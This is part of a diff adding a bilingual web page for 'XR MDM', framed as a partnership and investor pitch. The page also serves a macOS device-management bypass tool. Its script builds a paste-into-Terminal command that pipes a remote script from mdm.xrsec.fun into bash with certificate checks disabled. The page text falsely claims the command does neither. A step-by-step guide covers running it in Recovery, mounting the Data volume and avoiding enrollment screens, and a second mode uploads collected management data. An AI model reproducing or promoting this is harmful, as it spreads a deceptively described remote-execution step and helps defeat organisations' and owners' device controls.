+          <h2 data-i18n="contactTitle">有资源、有判断，也愿意一起做事？聊聊。</h2>
+          <p data-i18n="contactCopy">欢迎渠道方、产业伙伴与投资人联系。请简单说明你的机构、资源方向和合作设想，我们会认真回复每一次有效沟通。</p>
+          <div class="contact-actions">
+            <button class="button" id="copyWechat" type="button"><span data-i18n="wechat">复制微信：xr_sec</span><span class="arrow">↗</span></button>
+            <a class="button secondary" href="#top" data-i18n="backTop">返回顶部</a>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="wrap footer-inner">
+      <span>© 2026 XR MDM · <span data-i18n="footer">面向长期价值的合作计划</span></span>
+      <div class="footer-links">
+        <a href="https://beian.miit.gov.cn/" target="_blank" rel="noreferrer">赣ICP备2023013014号</a>
+        <a href="https://beian.mps.gov.cn/#/query/webSearch?code=36082602000219" target="_blank" rel="noreferrer">赣公网安备36082602000219</a>
+      </div>
+    </div>
+  </footer>
+  <div class="legal-overlay" id="legalOverlay" aria-hidden="true">
+    <section class="legal-dialog" role="dialog" aria-modal="true" aria-labelledby="legalTitle">
+      <div class="legal-head">
+        <div><p class="legal-kicker">LEGAL NOTICE · REQUIRED</p><h2 id="legalTitle" data-i18n="legalTitle">使用条款与授权确认</h2></div>
+        <button class="legal-close" id="legalClose" type="button" aria-label="关闭条款" data-i18n-aria="legalClose">×</button>
+      </div>
+      <div class="legal-scroll" id="legalScroll"><div class="legal-document" id="legalDocument" aria-live="polite"><p class="legal-loading">条款将在首次打开时加载。</p></div></div>
+      <div class="legal-actions">
+        <p class="legal-scroll-tip" id="legalScrollTip" data-i18n="legalScrollTip">请完整阅读并滚动至条款底部</p>
+        <label class="legal-check"><input id="legalAgree" type="checkbox" disabled><span class="legal-check-box" aria-hidden="true"></span><span data-i18n="legalAgree">我确认拥有设备合法操作权或已获得所有者及管理方明确授权，并已阅读、理解和同意上述条款。</span></label>
+        <div class="legal-authorize">
+          <button class="legal-cancel" id="legalCancel" type="button" data-i18n="legalCancel">取消</button>
+          <button class="legal-confirm" id="legalConfirm" type="button" data-i18n="legalConfirm" disabled>同意并复制</button>
+        </div>
+      </div>
+    </section>
+  </div>
+  <div class="legal-overlay" id="guideOverlay" aria-hidden="true">
+    <section class="guide-dialog" role="dialog" aria-modal="true" aria-labelledby="guideTitle">
+      <div class="legal-head">
+        <div><p class="legal-kicker">COMMAND COPIED · NEXT STEPS</p><h2 id="guideTitle" data-i18n="guideTitle">命令已复制，接下来这样操作</h2></div>
+        <button class="legal-close" id="guideClose" type="button" aria-label="关闭操作说明" data-i18n-aria="guideClose">×</button>
+      </div>
+      <div class="guide-scroll">
+        <p class="guide-intro" data-i18n="guideIntro">请回到需要处理的 Mac，按照当前所处环境打开终端并运行刚刚复制的命令。</p>
+        <ol class="guide-steps">
+          <li class="guide-step"><strong data-i18n="guideStepOneTitle">打开终端</strong><p data-i18n="guideStepOneCopy">根据桌面模式或 Recovery 的入口找到“终端”。</p></li>
+          <li class="guide-step"><strong data-i18n="guideStepTwoTitle">粘贴命令</strong><p data-i18n="guideStepTwoCopy">在终端中按 Command + V 粘贴，然后按 Return/回车运行。</p></li>
+          <li class="guide-step"><strong data-i18n="guideStepThreeTitle">按提示完成</strong><p data-i18n="guideStepThreeCopy">选择语言、阅读并确认声明，再根据终端提示选择系统卷或输入管理员密码。</p></li>
+        </ol>
+        <div class="guide-modes">
+          <div class="guide-mode"><strong data-i18n="guideDesktopTitle">正常桌面系统</strong><span data-i18n="guideDesktopCopy">打开“应用程序 → 实用工具 → 终端”。</span></div>
+          <div class="guide-mode"><strong data-i18n="guideRecoveryTitle">macOS Recovery</strong><span data-i18n="guideRecoveryCopy">从顶部菜单打开“实用工具 → 终端”。</span></div>
+        </div>
+        <h3 class="guide-warning" data-i18n="guideRecoveryImagesTitle">Recovery 入口与终端位置</h3>
+        <div class="guide-images">
+          <a class="guide-image-link" href="https://xrsec-fun.s3.bitiful.net/MDM/recovery.webp" target="_blank" rel="noreferrer"><img data-guide-src="https://xrsec-fun.s3.bitiful.net/MDM/recovery.webp" alt="Recovery 选项入口" data-i18n-alt="guideRecoveryImageAlt" loading="lazy"></a>
+          <a class="guide-image-link" href="https://xrsec-fun.s3.bitiful.net/MDM/terminal.webp" target="_blank" rel="noreferrer"><img data-guide-src="https://xrsec-fun.s3.bitiful.net/MDM/terminal.webp" alt="Recovery 终端菜单" data-i18n-alt="guideTerminalImageAlt" loading="lazy"></a>
+        </div>
+        <h3 class="guide-warning" data-i18n="guideDiskTitle">找不到磁盘或磁盘仍未装载</h3>
+        <p class="guide-warning-copy" data-i18n="guideDiskCopy">返回 Recovery 的磁盘工具，展开卷组，选择灰色的 Data/数据卷并点击“装载”，需要时输入 Mac 管理员密码，然后回到终端重试。</p>
+        <div class="guide-images">
+          <a class="guide-image-link" href="https://xrsec-fun.s3.bitiful.net/MDM/disk1.webp" target="_blank" rel="noreferrer"><img data-guide-src="https://xrsec-fun.s3.bitiful.net/MDM/disk1.webp" alt="Recovery 磁盘工具入口" data-i18n-alt="guideDiskOneAlt" loading="lazy"></a>
+          <a class="guide-image-link" href="https://xrsec-fun.s3.bitiful.net/MDM/disk2.webp" target="_blank" rel="noreferrer"><img data-guide-src="https://xrsec-fun.s3.bitiful.net/MDM/disk2.webp" alt="装载 Data 数据卷" data-i18n-alt="guideDiskTwoAlt" loading="lazy"></a>
+        </div>
+        <h3 class="guide-warning" data-i18n="guideWarningTitle">完成后注意</h3>
+        <p class="guide-warning-copy" data-i18n="guideWarningCopy">看到设备注册或远程管理页面时，不要进入注册详情；请按照终端结果和页面上的继续/返回提示操作。</p>
+        <div class="guide-images">
+          <a class="guide-image-link" href="https://xrsec-fun.s3.bitiful.net/MDM/tip1.webp" target="_blank" rel="noreferrer"><img data-guide-src="https://xrsec-fun.s3.bitiful.net/MDM/tip1.webp" alt="远程管理页面操作提示" data-i18n-alt="guideTipOneAlt" loading="lazy"></a>
+          <a class="guide-image-link" href="https://xrsec-fun.s3.bitiful.net/MDM/tip2.webp" target="_blank" rel="noreferrer"><img data-guide-src="https://xrsec-fun.s3.bitiful.net/MDM/tip2.webp" alt="设备注册通知操作提示" data-i18n-alt="guideTipTwoAlt" loading="lazy"></a>
+        </div>
+        <div class="guide-actions"><button class="guide-done" id="guideDone" type="button" data-i18n="guideDone">知道了</button></div>
+      </div>
+    </section>
+  </div>
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+  <script>
+    const translations = {
+      zh: {
+        title: 'XR MDM · 战略合作', navValue: '项目价值', navPartners: '合作商', navModels: '合作模式', navRoadmap: '共建路径', navContact: '联系合作',
+        eyebrow: '战略合作 · 资源共建', heroTitle: '让 Mac 设备服务<br>成为<span class="accent">增长生意</span>',
+        heroCopy: '我们正在把成熟的设备服务能力，升级为更清晰、更可靠、可规模化的合作网络。现面向渠道伙伴、生态伙伴与战略投资人开放合作。',
+        talk: '洽谈合作', explore: '查看合作方向', open: '开放中', ready: '在线可用', bypassTab: '绕过监管', analyzeTab: '分析监管', bypassTitle: '实用工具 → 终端', bypassCopy: '打开“实用工具”中的“终端”，点击下方按钮复制命令，粘贴后按回车运行。', analyzeTitle: '扫描并生成监管报告', analyzeCopy: '主动采集管理组件元数据，确认后上传并获得限时分析 URL。', copyCommand: '一键复制命令', commandNote: '使用 HTTPS 下载到临时文件并完成 Bash 语法检查；不会跳过证书校验或直接执行网络流。', commandCopied: '终端命令已复制', focus: '本阶段合作重点', briefTitle: '连接产品能力、市场渠道与长期资源',
+        tagChannel: '渠道共建', tagEco: '生态合作', tagCapital: '战略投资', tickerOne: 'Intel & Apple Silicon', tickerTwo: '中英双语服务', tickerThree: 'Web & CLI 触达', tickerFour: '灵活合作机制',
+        valueLabel: '为什么是现在', valueTitle: '从技术能力，走向可复制的合作价值', valueDesc: '项目已经形成清晰的服务入口与跨架构交付能力。下一阶段的关键不是堆叠功能，而是连接更好的渠道、服务场景和商业资源。',
+        valueOneTitle: '轻量可达', valueOneCopy: '一个入口同时服务网页访客与命令行用户，降低触达成本，为进一步产品化保留空间。', valueTwoTitle: '面向真实场景', valueTwoCopy: '聚焦 Mac 设备服务链路，以稳定、清晰、可协作为原则，适合与既有服务网络组合。', valueThreeTitle: '合作优先', valueThreeCopy: '支持渠道、生态和资源多种合作方式，以共同验证、阶段复盘和长期价值为导向。',
+        modelLabel: '合作模式', modelTitle: '不是单一融资，而是找到正确的共同建设者', modelDesc: '合作方案可围绕双方资源定制。我们更看重能力互补、长期信任和可以被验证的共同目标。', modelOneTitle: '渠道合作', modelOneCopy: '面向设备服务商、企业 IT 服务商与垂直渠道，共同建立客户触达、服务交付和反馈闭环。', modelTwoTitle: '生态共建', modelTwoCopy: '与软硬件伙伴、云服务和专业服务团队协作，补齐产品、合规、运维与客户成功能力。', modelThreeTitle: '战略投资', modelThreeCopy: '引入理解技术服务与长期运营的产业或财务伙伴，共同推进产品化、品牌建设与市场拓展。',
+        partnerLabel: '合作商', partnerTitle: '一起把 Mac 服务做得更完整', partnerDesc: '这里展示当前开放的合作商角色。确认真实合作商后，可直接将名称与简介替换为正式资料。', partnerOneTitle: '设备服务合作商', partnerOneCopy: '提供 Mac 流通、检测、交付与售后能力，共同缩短从设备到服务的链路。', partnerTwoTitle: '企业 IT 合作商', partnerTwoCopy: '连接企业客户、IT 运维与设备管理场景，共建标准化交付和反馈机制。', partnerThreeTitle: '安全与合规合作商', partnerThreeCopy: '围绕终端识别、数据合规和风险边界，为产品提供专业审核与长期治理能力。',
+        resourceLabel: '期待的资源', resourceTitle: '把互补能力，变成共同增量', resourceDesc: '如果你在以下任一方向拥有经验或资源，我们愿意从一次具体合作开始。', resourceOneTitle: '市场与渠道', resourceOneCopy: '企业客户、设备流通、IT 服务网络及跨区域市场拓展。', resourceTwoTitle: '产品与运营', resourceTwoCopy: '产品化方法、服务标准、客户成功与规模化运营经验。', resourceThreeTitle: '合规与生态', resourceThreeCopy: '企业设备管理、数据合规、安全治理和行业生态协同。', resourceFourTitle: '资本与长期资源', resourceFourCopy: '理解技术服务长期价值，并能提供产业协同的合作伙伴。',
+        roadmapLabel: '共建路径', roadmapTitle: '小步验证，清晰复盘，长期同行', stageOneTitle: '能力对齐', stageOneCopy: '交换资源与目标，明确双方最有价值的合作切入点。', stageTwoTitle: '联合验证', stageTwoCopy: '以小范围场景验证交付、市场反馈和协作效率。', stageThreeTitle: '规模共建', stageThreeCopy: '基于真实结果设计长期机制，放大产品与渠道价值。',
+        contactTitle: '有资源、有判断，也愿意一起做事？聊聊。', contactCopy: '欢迎渠道方、产业伙伴与投资人联系。请简单说明你的机构、资源方向和合作设想，我们会认真回复每一次有效沟通。', wechat: '复制微信：xr_sec', backTop: '返回顶部', footer: '面向长期价值的合作计划', copied: '微信号已复制',
+        legalTitle: '使用条款与授权确认', legalScrollTip: '请完整阅读并滚动至条款底部', legalAgree: '我确认拥有设备合法操作权或已获得所有者及管理方明确授权，并已阅读、理解和同意上述条款。', legalClose: '关闭条款', legalCancel: '取消', legalConfirm: '同意并复制', legalLoading: '正在加载条款…', legalReady: '请完整阅读并滚动至条款底部', legalRead: '已阅读至条款底部，请勾选授权确认', legalFailed: '条款加载失败，确认已停用', legalRetry: '条款加载失败，请检查网络后重试。',
+        guideTitle: '命令已复制，接下来这样操作', guideIntro: '请回到需要处理的 Mac，按照当前所处环境打开终端并运行刚刚复制的命令。', guideStepOneTitle: '打开终端', guideStepOneCopy: '根据桌面模式或 Recovery 的入口找到“终端”。', guideStepTwoTitle: '粘贴命令', guideStepTwoCopy: '在终端中按 Command + V 粘贴，然后按 Return/回车运行。', guideStepThreeTitle: '按提示完成', guideStepThreeCopy: '选择语言、阅读并确认声明，再根据终端提示选择系统卷或输入管理员密码。', guideDesktopTitle: '正常桌面系统', guideDesktopCopy: '打开“应用程序 → 实用工具 → 终端”。', guideRecoveryTitle: 'macOS Recovery', guideRecoveryCopy: '从顶部菜单打开“实用工具 → 终端”。', guideRecoveryImagesTitle: 'Recovery 入口与终端位置', guideDiskTitle: '找不到磁盘或磁盘仍未装载', guideDiskCopy: '返回 Recovery 的磁盘工具，展开卷组，选择灰色的 Data/数据卷并点击“装载”，需要时输入 Mac 管理员密码，然后回到终端重试。', guideWarningTitle: '完成后注意', guideWarningCopy: '看到设备注册或远程管理页面时，不要进入注册详情；请按照终端结果和页面上的继续/返回提示操作。', guideClose: '关闭操作说明', guideDone: '知道了', guideRecoveryImageAlt: 'Recovery 选项入口', guideTerminalImageAlt: 'Recovery 终端菜单', guideDiskOneAlt: 'Recovery 磁盘工具入口', guideDiskTwoAlt: '装载 Data 数据卷', guideTipOneAlt: '远程管理页面操作提示', guideTipTwoAlt: '设备注册通知操作提示'
+      },
+      en: {
+        title: 'XR MDM · Strategic Partnerships', navValue: 'Why us', navPartners: 'Partners', navModels: 'Partnerships', navRoadmap: 'Roadmap', navContact: 'Contact',
+        eyebrow: 'Strategic partnership · Shared growth', heroTitle: 'Turn Mac device services<br>into a <span class="accent">growth business</span>',
+        heroCopy: 'We are turning proven device-service capabilities into a clearer, more reliable and scalable partner network—open to channel partners, ecosystem builders and strategic investors.',
+        talk: 'Start a conversation', explore: 'Explore partnerships', open: 'Now open', ready: 'Online', bypassTab: 'Bypass management', analyzeTab: 'Analyze management', bypassTitle: 'Utilities → Terminal', bypassCopy: 'Open Terminal from Utilities, copy the command below, paste it and press Return.', analyzeTitle: 'Scan and build a management report', analyzeCopy: 'Collects management metadata on demand, uploads after confirmation and returns an expiring report URL.', copyCommand: 'Copy terminal command', commandNote: 'Uses HTTPS, downloads to a temporary file and validates Bash syntax without disabling certificate checks or directly executing a network stream.', commandCopied: 'Terminal command copied', focus: 'Current partnership focus', briefTitle: 'Connect product capability, market access and long-term resources',
+        tagChannel: 'Channel growth', tagEco: 'Ecosystem', tagCapital: 'Investment', tickerOne: 'Intel & Apple Silicon', tickerTwo: 'Bilingual service', tickerThree: 'Web & CLI access', tickerFour: 'Flexible partnerships',
+        valueLabel: 'Why now', valueTitle: 'From technical capability to repeatable partner value', valueDesc: 'The project has a clear service entry point and cross-architecture delivery capability. The next step is not more feature volume—it is better channels, use cases and commercial resources.',
+        valueOneTitle: 'Easy to reach', valueOneCopy: 'One entry point serves both web visitors and command-line users, reducing friction while leaving room for deeper productization.', valueTwoTitle: 'Built for real use', valueTwoCopy: 'Focused on the Mac device-service journey, with stability, clarity and collaboration at the center.', valueThreeTitle: 'Partner first', valueThreeCopy: 'Channel, ecosystem and strategic resource models are all open, guided by joint validation and long-term value.',
+        modelLabel: 'Partnership models', modelTitle: 'Not capital alone—the right people to build with', modelDesc: 'Each engagement can be shaped around complementary strengths. We value trust, practical collaboration and goals that can be proven.', modelOneTitle: 'Channel partnership', modelOneCopy: 'Work with device providers, enterprise IT services and specialist channels to build a complete reach, delivery and feedback loop.', modelTwoTitle: 'Ecosystem building', modelTwoCopy: 'Collaborate with software, hardware, cloud and professional-service teams across product, compliance, operations and customer success.', modelThreeTitle: 'Strategic investment', modelThreeCopy: 'Bring in industrial or financial partners who understand technical services and long-term operations to advance product, brand and market growth.',
+        partnerLabel: 'Partners', partnerTitle: 'Build a more complete Mac service together', partnerDesc: 'These are the partner roles currently open. Confirmed partner names and profiles can replace these cards directly.', partnerOneTitle: 'Device service partners', partnerOneCopy: 'Mac circulation, inspection, delivery and after-sales capabilities that shorten the path from device to service.', partnerTwoTitle: 'Enterprise IT partners', partnerTwoCopy: 'Connect enterprise customers, IT operations and device-management use cases through standardized delivery and feedback.', partnerThreeTitle: 'Security & compliance partners', partnerThreeCopy: 'Bring expert review and long-term governance to endpoint identification, data compliance and risk boundaries.',
+        resourceLabel: 'What we seek', resourceTitle: 'Turn complementary strengths into shared upside', resourceDesc: 'If you bring experience or resources in any of these areas, we are ready to begin with one concrete collaboration.', resourceOneTitle: 'Market & channels', resourceOneCopy: 'Enterprise customers, device circulation, IT service networks and regional expansion.', resourceTwoTitle: 'Product & operations', resourceTwoCopy: 'Product strategy, service standards, customer success and scalable operations.', resourceThreeTitle: 'Compliance & ecosystem', resourceThreeCopy: 'Enterprise device management, data compliance, security governance and industry collaboration.', resourceFourTitle: 'Capital & long-term resources', resourceFourCopy: 'Partners who understand the durable value of technical services and can bring strategic leverage.',
+        roadmapLabel: 'How we build', roadmapTitle: 'Validate in steps. Review clearly. Grow for the long term.', stageOneTitle: 'Align strengths', stageOneCopy: 'Map resources and goals to identify the most valuable starting point.', stageTwoTitle: 'Run a pilot', stageTwoCopy: 'Test delivery, market response and collaboration in a focused scenario.', stageThreeTitle: 'Scale together', stageThreeCopy: 'Design a lasting model from real results and expand product and channel value.',
+        contactTitle: 'Bring resources, conviction and a builder mindset? Let’s talk.', contactCopy: 'We welcome channel leaders, industry partners and investors. Tell us briefly about your organization, strengths and partnership idea—we read every serious note.', wechat: 'Copy WeChat: xr_sec', backTop: 'Back to top', footer: 'A partnership plan built for long-term value', copied: 'WeChat ID copied',
+        legalTitle: 'Terms and authorization', legalScrollTip: 'Read the complete notice and scroll to the bottom', legalAgree: 'I confirm that I legally control this device or have explicit authorization from its owner and management authority, and that I have read, understood and accepted these terms.', legalClose: 'Close terms', legalCancel: 'Cancel', legalConfirm: 'Accept and copy', legalLoading: 'Loading notice…', legalReady: 'Read the complete notice and scroll to the bottom', legalRead: 'Notice read to the bottom; select the authorization checkbox', legalFailed: 'Notice unavailable; confirmation disabled', legalRetry: 'Unable to load the notice. Check your connection and try again.',
+        guideTitle: 'Command copied — what to do next', guideIntro: 'Return to the Mac you want to service, open Terminal for the current environment, and run the command you just copied.', guideStepOneTitle: 'Open Terminal', guideStepOneCopy: 'Use the desktop or Recovery instructions below to find Terminal.', guideStepTwoTitle: 'Paste the command', guideStepTwoCopy: 'Press Command + V in Terminal, then press Return to run it.', guideStepThreeTitle: 'Follow the prompts', guideStepThreeCopy: 'Choose a language, read and confirm the notice, then select the system volume or enter an administrator password when prompted.', guideDesktopTitle: 'Normal desktop macOS', guideDesktopCopy: 'Open Applications → Utilities → Terminal.', guideRecoveryTitle: 'macOS Recovery', guideRecoveryCopy: 'Open Utilities → Terminal from the menu bar.', guideRecoveryImagesTitle: 'Finding Recovery and Terminal', guideDiskTitle: 'Disk missing or still unmounted', guideDiskCopy: 'Return to Disk Utility in Recovery, expand the volume group, select the grey Data volume and click Mount. Enter the Mac administrator password if requested, then return to Terminal and try again.', guideWarningTitle: 'After completion', guideWarningCopy: 'If Device Enrollment or Remote Management appears, do not open registration details. Follow the Terminal result and the Continue/Back guidance shown on screen.', guideClose: 'Close instructions', guideDone: 'Got it', guideRecoveryImageAlt: 'Recovery Options entry', guideTerminalImageAlt: 'Terminal in the Recovery Utilities menu', guideDiskOneAlt: 'Disk Utility in Recovery', guideDiskTwoAlt: 'Mounting the Data volume', guideTipOneAlt: 'Remote Management screen guidance', guideTipTwoAlt: 'Device Enrollment notification guidance'
+      }
+    };
+
+    const languageButton = document.getElementById('languageButton');
+    const modeTabs = Array.from(document.querySelectorAll('.mode-tab'));
+    const toolIndex = document.getElementById('toolIndex');
+    const toolTitle = document.getElementById('toolTitle');
+    const toolCopy = document.getElementById('toolCopy');
+    const copyCommand = document.getElementById('copyCommand');
+    const legalOverlay = document.getElementById('legalOverlay');
+    const legalClose = document.getElementById('legalClose');
+    const legalCancel = document.getElementById('legalCancel');
+    const legalScroll = document.getElementById('legalScroll');
+    const legalDocument = document.getElementById('legalDocument');
+    const legalScrollTip = document.getElementById('legalScrollTip');
+    const legalAgree = document.getElementById('legalAgree');
+    const legalConfirm = document.getElementById('legalConfirm');
+    const guideOverlay = document.getElementById('guideOverlay');
+    const guideClose = document.getElementById('guideClose');
+    const guideDone = document.getElementById('guideDone');
+    let legalNoticeLanguage = '';
+    const legalNoticeCache = new Map();
+    const legalNoticeLoads = new Map();
+    let legalRead = false;
+    let toolMode = 'bypass';
+    const localeOptions = Intl.DateTimeFormat().resolvedOptions();
+    const browserLocales = [
+      localeOptions.locale,
+      ...(Array.isArray(navigator.languages) ? navigator.languages : []),
+      navigator.language
+    ].filter(Boolean).map((locale) => locale.replace('_', '-').toLowerCase());
+    const chineseTimeZones = new Set([
+      'Asia/Shanghai', 'Asia/Chongqing', 'Asia/Harbin', 'Asia/Urumqi',
+      'Asia/Hong_Kong', 'Asia/Macau'
+    ]);
+    const prefersChinese = browserLocales.some((locale) =>
+      locale === 'zh' || locale.startsWith('zh-') || /-(cn|hk|mo)$/.test(locale)
+    ) || chineseTimeZones.has(localeOptions.timeZone);
+    let storedLanguage = '';
+    try {
+      storedLanguage = localStorage.getItem('xr-language') || '';
+    } catch {
+      storedLanguage = '';
+    }
+    const detectedLanguage = prefersChinese ? 'zh' : 'en';
+    let language = storedLanguage === 'zh' || storedLanguage === 'en' ? storedLanguage : detectedLanguage;
+
+    function updateToolbox() {
+      const text = translations[language];
+      const analyze = toolMode === 'analyze';
+      toolIndex.textContent = analyze ? '02 / ANALYZE' : '01 / BYPASS';
+      toolTitle.textContent = analyze ? text.analyzeTitle : text.bypassTitle;
+      toolCopy.textContent = analyze ? text.analyzeCopy : text.bypassCopy;
+      modeTabs.forEach((tab) => {
+        const active = tab.dataset.mode === toolMode;
+        tab.classList.toggle('active', active);
+        tab.setAttribute('aria-selected', String(active));
+      });
+    }
+
+    function applyLanguage() {
+      const text = translations[language];
+      document.documentElement.lang = language === 'zh' ? 'zh-CN' : 'en';
+      document.title = text.title;
+      document.querySelectorAll('[data-i18n]').forEach((element) => {
+        element.textContent = text[element.dataset.i18n];
+      });
+      document.querySelectorAll('[data-i18n-html]').forEach((element) => {
+        element.innerHTML = text[element.dataset.i18nHtml];
+      });
+      document.querySelectorAll('[data-i18n-placeholder]').forEach((element) => {
+        element.placeholder = text[element.dataset.i18nPlaceholder];
+      });
+      document.querySelectorAll('[data-i18n-aria]').forEach((element) => {
+        element.setAttribute('aria-label', text[element.dataset.i18nAria]);
+      });
+      document.querySelectorAll('[data-i18n-alt]').forEach((element) => {
+        element.setAttribute('alt', text[element.dataset.i18nAlt]);
+      });
+      languageButton.textContent = language === 'zh' ? 'EN' : '中文';
+      updateToolbox();
+    }
+
+    languageButton.addEventListener('click', () => {
+      language = language === 'zh' ? 'en' : 'zh';
+      try {
+        localStorage.setItem('xr-language', language);
+      } catch {
+        // Language switching still works when storage is unavailable.
+      }
+      applyLanguage();
+    });
+
+    modeTabs.forEach((tab) => {
+      tab.addEventListener('click', () => {
+        toolMode = tab.dataset.mode;
+        updateToolbox();
+      });
+    });
+
+    function legacyCopy(text) {
+      const area = document.createElement('textarea');
+      area.value = text;
+      area.setAttribute('readonly', '');
+      area.style.position = 'fixed';
+      area.style.top = '-1000px';
+      area.style.opacity = '0';
+      document.body.appendChild(area);
+      area.focus();
+      area.select();
+      area.setSelectionRange(0, area.value.length);
+      let copied = false;
+      try {
+        copied = document.execCommand('copy');
+      } catch {
+        copied = false;
+      }
+      area.remove();
+      return copied;
+    }
+
+    async function copyToClipboard(text) {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        try {
+          await navigator.clipboard.writeText(text);
+          return true;
+        } catch {
+          // Older Safari and non-secure contexts fall back below.
+        }
+      }
+      if (legacyCopy(text)) return true;
+      window.prompt(language === 'zh' ? '复制失败，请手动复制：' : 'Copy failed. Copy manually:', text);
+      return false;
+    }
+
+    function buildCommand(mode) {
+      const scriptPath = mode === 'analyze' ? '/college.sh' : '';
+      const url = `mdm.xrsec.fun${scriptPath}`;
+      return `bash <(curl -kfsSL ${url})`;
+    }
+
+    function showCopiedToast() {
+      const toast = document.getElementById('toast');
+      toast.textContent = translations[language].commandCopied;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 1800);
+    }
+
+    async function copyModeCommand(mode) {
+      const copied = await copyToClipboard(buildCommand(mode));
+      if (!copied) return;
+      showCopiedToast();
+      openGuideNotice();
+    }
+
+    function openGuideNotice() {
+      document.querySelectorAll('[data-guide-src]').forEach((image) => {
+        if (!image.getAttribute('src')) image.setAttribute('src', image.dataset.guideSrc);
+      });
+      guideOverlay.classList.add('show');
+      guideOverlay.setAttribute('aria-hidden', 'false');
+      document.body.style.overflow = 'hidden';
+      guideClose.focus();
+    }
+
+    function closeGuideNotice() {
+      guideOverlay.classList.remove('show');
+      guideOverlay.setAttribute('aria-hidden', 'true');
+      document.body.style.overflow = '';
+      copyCommand.focus();
+    }
+
+    function updateLegalConfirm() {
+      legalConfirm.disabled = !(legalRead && legalAgree.checked);
+    }
+
+    function markLegalReadIfComplete() {
+      if (legalNoticeLanguage !== language) return;
+      const reachedBottom = legalScroll.scrollHeight - legalScroll.scrollTop <= legalScroll.clientHeight + 12;
+      if (!reachedBottom) return;
+      legalRead = true;
+      legalAgree.disabled = false;
+      legalScrollTip.textContent = translations[language].legalRead;
+      updateLegalConfirm();
+    }
+
+    async function loadLegalNotice() {
+      const targetLanguage = language;
+      if (legalNoticeLanguage === targetLanguage) return true;
+      let article = legalNoticeCache.get(targetLanguage);
+      try {
+        if (!article) {
+          let load = legalNoticeLoads.get(targetLanguage);
+          if (!load) {
+            load = (async () => {
+              const noticePath = targetLanguage === 'en' ? '/legal-notice.en.html' : '/legal-notice.html';
+              const response = await fetch(noticePath, {
+                credentials: 'same-origin',
+                headers: { Accept: 'text/html' }
+              });
+              if (!response.ok || !String(response.headers.get('content-type') || '').startsWith('text/html')) {
+                throw new Error('legal_notice_unavailable');
+              }
+              const source = await response.text();
+              const parsed = new DOMParser().parseFromString(source, 'text/html');
+              const parsedArticle = parsed.querySelector('article');
+              const parsedText = parsedArticle ? parsedArticle.textContent : '';
+              const requiredPhrases = targetLanguage === 'en' ? ['Prohibited Uses', 'Interactive Confirmation'] : ['禁止行为', '交互确认'];
+              if (!parsedArticle || !requiredPhrases.every((phrase) => parsedText.includes(phrase))) {
+                throw new Error('invalid_legal_notice');
+              }
+              const allowedTags = new Set(['ARTICLE', 'SECTION', 'H1', 'H2', 'P', 'STRONG', 'UL', 'OL', 'LI', 'CODE']);
+              const elements = [parsedArticle, ...parsedArticle.querySelectorAll('*')];
+              if (elements.some((element) => !allowedTags.has(element.tagName))) {
+                throw new Error('unsafe_legal_notice');
+              }
+              elements.forEach((element) => {
+                Array.from(element.attributes).forEach((attribute) => {
+                  if (attribute.name !== 'class') element.removeAttribute(attribute.name);
+                });
+              });
+              return parsedArticle;
+            })();
+            legalNoticeLoads.set(targetLanguage, load);
+          }
+          article = await load;
+          legalNoticeCache.set(targetLanguage, article);
+          legalNoticeLoads.delete(targetLanguage);
+        }
+        if (language !== targetLanguage) return false;
+        legalDocument.replaceChildren(document.importNode(article.cloneNode(true), true));
+        legalNoticeLanguage = targetLanguage;
+        legalScrollTip.textContent = translations[targetLanguage].legalReady;
+        legalScroll.scrollTop = 0;
+        requestAnimationFrame(markLegalReadIfComplete);
+        return true;
+      } catch {
+        legalNoticeLoads.delete(targetLanguage);
+        if (language !== targetLanguage) return false;
+        legalNoticeLanguage = '';
+        legalDocument.replaceChildren(Object.assign(document.createElement('p'), {
+          className: 'legal-loading',
+          textContent: translations[targetLanguage].legalRetry
+        }));
+        legalScrollTip.textContent = translations[targetLanguage].legalFailed;
+        return false;
+      }
+    }
+
+    function openLegalNotice() {
+      legalRead = false;
+      legalAgree.checked = false;
+      legalAgree.disabled = true;
+      legalConfirm.disabled = true;
+      legalScrollTip.textContent = legalNoticeLanguage === language ? translations[language].legalReady : translations[language].legalLoading;
+      legalOverlay.classList.add('show');
+      legalOverlay.setAttribute('aria-hidden', 'false');
+      document.body.style.overflow = 'hidden';
+      legalClose.focus();
+      if (legalNoticeLanguage === language) {
+        legalScroll.scrollTop = 0;
+        requestAnimationFrame(markLegalReadIfComplete);
+      } else {
+        legalDocument.replaceChildren(Object.assign(document.createElement('p'), {
+          className: 'legal-loading',
+          textContent: translations[language].legalLoading
+        }));
+        void loadLegalNotice();
+      }
+    }
+
+    function closeLegalNotice() {
+      legalOverlay.classList.remove('show');
+      legalOverlay.setAttribute('aria-hidden', 'true');
+      document.body.style.overflow = '';
+      copyCommand.focus();
+    }
+
+    copyCommand.addEventListener('click', () => {
+      if (toolMode === 'bypass') {
+        openLegalNotice();
+      } else {
+        copyModeCommand('analyze');
+      }
+    });
+
+    legalScroll.addEventListener('scroll', markLegalReadIfComplete);
+    legalAgree.addEventListener('change', updateLegalConfirm);
+    legalClose.addEventListener('click', closeLegalNotice);
+    legalCancel.addEventListener('click', closeLegalNotice);
+    legalOverlay.addEventListener('click', (event) => {
+      if (event.target === legalOverlay) closeLegalNotice();
+    });
+    guideClose.addEventListener('click', closeGuideNotice);
+    guideDone.addEventListener('click', closeGuideNotice);
+    guideOverlay.addEventListener('click', (event) => {
+      if (event.target === guideOverlay) closeGuideNotice();
+    });
+    legalConfirm.addEventListener('click', async () => {
+      if (legalConfirm.disabled) return;
+      const copied = await copyToClipboard(buildCommand('bypass'));
+      if (!copied) return;
+      closeLegalNotice();
+      showCopiedToast();
+      openGuideNotice();
+    });
+    document.addEventListener('keydown', (event) => {
+      if (event.key !== 'Escape') return;
+      if (guideOverlay.classList.contains('show')) closeGuideNotice();
+      else if (legalOverlay.classList.contains('show')) closeLegalNotice();
+    });
+
+    document.getElementById('copyWechat').addEventListener('click', async () => {
+      const copied = await copyToClipboard('xr_sec');
+      if (!copied) return;
+      const toast = document.getElementById('toast');
+      toast.textContent = translations[language].copied;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 1800);
+    });
+
+    applyLanguage();
+  </script>
+</body>
+</html>
